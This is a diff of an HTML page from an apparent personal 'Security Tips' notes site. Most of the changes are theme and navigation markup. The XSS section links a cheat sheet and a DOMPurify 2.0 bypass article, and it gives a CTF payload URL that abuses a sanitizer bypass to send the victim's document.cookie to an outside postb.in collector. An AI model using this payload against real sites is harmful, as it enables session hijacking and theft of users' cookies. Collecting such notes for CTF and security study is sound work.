@@ -9,10 +9,7 @@
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>XSS - Security Tips</title>
-  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>
-
-  <link rel="stylesheet" href="../css/theme.css" type="text/css" />
-  <link rel="stylesheet" href="../css/theme_extra.css" type="text/css" />
+  <link rel="stylesheet" href="../css/style.css" type="text/css" />
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
   
   <script>
@@ -25,6 +22,11 @@
   <script src="../js/jquery-2.1.1.min.js" defer></script>
   <script src="../js/modernizr-2.8.3.min.js" defer></script>
   <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/powershell.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/nginx.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
   <script>hljs.initHighlightingOnLoad();</script> 
   
   <script>
@@ -39,231 +41,204 @@
   
 </head>
 
-<body class="wy-body-for-nav" role="document">
+<body class="ready sticky">
 
-  <div class="wy-grid-for-nav">
+  <main>
 
     
-    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
-      <div class="wy-side-nav-search">
-        <a href=".." class="icon icon-home"> Security Tips</a>
-        <div role="search">
-  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
-    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
-  </form>
+    <aside class="sidebar">
+      <div class="search">
+	<div class="input-wrap">
+		<form action="../search.html" method="get">
+			<input type="search" name="q" placeholder="Search docs" title="Type search term here" />
+		</form>
+	</div>
 </div>
-      </div>
+      
+      <h1 class="app-name"><a class="app-name-link" data-nosearch="" href="/">Security Tips</a></h1>
 
-      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
-	<ul class="current">
-	  
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="..">Home</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../aws/">AWS</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <span class="caption-text">Containers</span>
-    <ul class="subnav">
-                <li class="">
-                    
-    <a class="" href="../docker/">Docker</a>
-                </li>
-                <li class="">
-                    
-    <a class="" href="../kubernetes/">Kubernetes</a>
-                </li>
-    </ul>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../nginx/">Nginx</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../windows/">Windows</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../linux/">Linux</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../xxe/">XXE</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <a class="" href="../zip/">Zip</a>
-	    </li>
-          
-            <li class="toctree-l1">
-		
-    <span class="caption-text">Web</span>
-    <ul class="subnav">
-                <li class=" current">
-                    
-    <a class="current" href="./">XSS</a>
-    <ul class="subnav">
-            
-    <li class="toctree-l3"><a href="#xss">XSS</a></li>
-    
+      <div class="sidebar-nav">
         <ul>
-        
-            <li><a class="toctree-l4" href="#cheat-sheet">Cheat sheet</a></li>
-        
-            <li><a class="toctree-l4" href="#dompurify-20-bypass">DOMPurify 2.0 bypass</a></li>
-        
-        </ul>
+    	    
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="..">Home</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../aws/">AWS</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <span class="section-link ">Containers</span>
+    <ul>
+                <li class="">
+                    
+    <a class="section-link" href="../docker/">Docker</a>
+                </li>
+                <li class="">
+                    
+    <a class="section-link" href="../kubernetes/">Kubernetes</a>
+                </li>
+    </ul>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../nginx/">Nginx</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../windows/">Windows</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../linux/">Linux</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../xxe/">XXE</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <a class="section-link" href="../zip/">Zip</a>
+          </li>
+          
+          <li class="bold">
+		        
+    <span class="section-link active">Web</span>
+    <ul>
+                <li class="active">
+                    
+    <a class="section-link" href="./">XSS</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#cheat-sheet">Cheat sheet</a></li>
+    
+        <li><a class="" href="#dompurify-20-bypass">DOMPurify 2.0 bypass</a></li>
+    
+    </ul>
     
 
     </ul>
                 </li>
                 <li class="">
                     
-    <a class="" href="../API/">API</a>
+    <a class="section-link" href="../API/">API</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../oauth/">OAuth</a>
+    <a class="section-link" href="../oauth/">OAuth</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../path-traversal/">Path Traversal</a>
+    <a class="section-link" href="../path-traversal/">Path Traversal</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../graphql/">GraphQL</a>
+    <a class="section-link" href="../graphql/">GraphQL</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../git/">Git</a>
+    <a class="section-link" href="../git/">Git</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../jwt/">JWT</a>
+    <a class="section-link" href="../jwt/">JWT</a>
                 </li>
     </ul>
-	    </li>
+          </li>
           
-            <li class="toctree-l1">
-		
-    <a class="" href="../configuration-review/">Configuration Review</a>
-	    </li>
+          <li class="bold">
+		        
+    <a class="section-link" href="../configuration-review/">Configuration Review</a>
+          </li>
           
-            <li class="toctree-l1">
-		
-    <span class="caption-text">CVE</span>
-    <ul class="subnav">
+          <li class="bold">
+		        
+    <span class="section-link ">CVE</span>
+    <ul>
                 <li class="">
                     
-    <a class="" href="../cve/CVE-2019-1388/">CVE-2019-1388</a>
+    <a class="section-link" href="../cve/CVE-2019-1388/">CVE-2019-1388</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../cve/CVE-2019-11581/">CVE-2019-11581</a>
+    <a class="section-link" href="../cve/CVE-2019-11581/">CVE-2019-11581</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../cve/CVE-2019-16759/">CVE-2019-16759</a>
+    <a class="section-link" href="../cve/CVE-2019-16759/">CVE-2019-16759</a>
                 </li>
     </ul>
-	    </li>
+          </li>
           
-            <li class="toctree-l1">
-		
-    <span class="caption-text">SDR</span>
-    <ul class="subnav">
+          <li class="bold">
+		        
+    <span class="section-link ">SDR</span>
+    <ul>
                 <li class="">
                     
-    <a class="" href="../sdr/challs-dont-matter-anymore/hackingforsoju/">Challs Dont Matter Anymore</a>
+    <a class="section-link" href="../sdr/challs-dont-matter-anymore/hackingforsoju/">Challs Dont Matter Anymore</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../sdr/lit-fam/hackingforsoju/">lit-fam</a>
+    <a class="section-link" href="../sdr/lit-fam/hackingforsoju/">lit-fam</a>
                 </li>
     </ul>
-	    </li>
+          </li>
           
-            <li class="toctree-l1">
-		
-    <span class="caption-text">Misc</span>
-    <ul class="subnav">
+          <li class="bold">
+		        
+    <span class="section-link ">Misc</span>
+    <ul>
                 <li class="">
                     
-    <a class="" href="../firefox/">Firefox</a>
+    <a class="section-link" href="../firefox/">Firefox</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../iscsi/">ISCSI</a>
+    <a class="section-link" href="../iscsi/">ISCSI</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../reverse-shell/">Reverse Shell</a>
+    <a class="section-link" href="../reverse-shell/">Reverse Shell</a>
                 </li>
                 <li class="">
                     
-    <a class="" href="../waf/">WAF</a>
+    <a class="section-link" href="../waf/">WAF</a>
                 </li>
     </ul>
-	    </li>
+          </li>
           
         </ul>
       </div>
-      &nbsp;
-    </nav>
+    </aside>
 
-    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
-
+    <section class="content">
       
-      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
-        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
-        <a href="..">Security Tips</a>
-      </nav>
-
-      
-      <div class="wy-nav-content">
-        <div class="rst-content">
-          <div role="navigation" aria-label="breadcrumbs navigation">
-  <ul class="wy-breadcrumbs">
-    <li><a href="..">Docs</a> &raquo;</li>
-    
-      
-        
-          <li>Web &raquo;</li>
-        
-      
-    
-    <li>XSS</li>
-    <li class="wy-breadcrumbs-aside">
-      
-    </li>
-  </ul>
-  <hr/>
-</div>
-          <div role="main">
-            <div class="section">
-              
-                <h1 id="xss">XSS</h1>
+      <article class="markdown-section" id="main">
+        <div role="main">
+          <div class="section">
+            
+              <h1 id="xss">XSS</h1>
 <h2 id="cheat-sheet">Cheat sheet</h2>
 <p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p>
 <h2 id="dompurify-20-bypass">DOMPurify 2.0 bypass</h2>
 <p>https://research.securitum.com/dompurify-bypass-using-mxss/</p>
 <pre><code>http://qual-challs.rtfm.re:8080/?layout=&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a%20id=&quot;&lt;/style&gt;&lt;style&gt;%40keyframes%20slidein%20%7B%7D&lt;%2Fstyle&gt;&lt;a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie&gt;&lt;%2Fa&gt;%20&quot;&gt;
 </code></pre>
-              
-            </div>
+            
           </div>
           <footer>
   
@@ -280,18 +255,15 @@
   <hr/>
 
   <div role="contentinfo">
-    <!-- Copyright etc -->
     
   </div>
 
-  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a> and <a href="https://github.com/docsifyjs/docsify">Docsify</a>.
 </footer>
       
         </div>
-      </div>
-
+      </article>
     </section>
-
   </div>
 
   <div class="rst-versions" role="note" style="cursor: pointer">
